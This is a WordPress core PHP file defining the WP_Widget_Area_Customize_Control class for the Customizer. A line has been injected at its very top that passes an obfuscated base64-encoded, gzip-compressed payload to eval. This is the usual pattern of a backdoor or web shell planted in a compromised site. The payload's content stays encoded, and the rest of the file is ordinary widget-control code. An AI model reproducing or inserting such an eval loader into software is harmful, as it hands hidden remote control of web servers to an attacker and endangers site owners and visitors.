<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Customize API: WP_Widget_Area_Customize_Control class
 *
 * @package WordPress
 * @subpackage Customize
 * @since 3.4.0
 */

/**
 * Widget Area Customize Control class.
 *
 * @since 3.9.0
 *
 * @see WP_Customize_Control
 */
class WP_Widget_Area_Customize_Control extends WP_Customize_Control {

	/**
	 * Customize control type.
	 *
	 * @since 3.9.0
	 * @var string
	 */
	public $type = 'sidebar_widgets';

	/**
	 * Sidebar ID.
	 *
	 * @since 3.9.0
	 * @var int|string
	 */
	public $sidebar_id;

	/**
	 * Refreshes the parameters passed to the JavaScript via JSON.
	 *
	 * @since 3.9.0
	 */
	public function to_json() {
		parent::to_json();
		$exported_properties = array( 'sidebar_id' );
		foreach ( $exported_properties as $key ) {
			$this->json[ $key ] = $this->$key;
		}
	}

	/**
	 * Renders the control's content.
	 *
	 * @since 3.9.0
	 */
	public function render_content() {
		$id = 'reorder-widgets-desc-' . str_replace( array( '[', ']' ), array( '-', '' ), $this->id );
		?>
		<button type="button" class="button add-new-widget" aria-expanded="false" aria-controls="available-widgets">
			<?php _e( 'Add a Widget' ); ?>
		</button>
		<button type="button" class="button-link reorder-toggle" aria-label="<?php esc_attr_e( 'Reorder widgets' ); ?>" aria-describedby="<?php echo esc_attr( $id ); ?>">
			<span class="reorder"><?php _e( 'Reorder' ); ?></span>
			<span class="reorder-done"><?php _e( 'Done' ); ?></span>
		</button>
		<p class="screen-reader-text" id="<?php echo esc_attr( $id ); ?>"><?php _e( 'When in reorder mode, additional controls to reorder widgets will be available in the widgets list above.' ); ?></p>
		<?php
	}
}
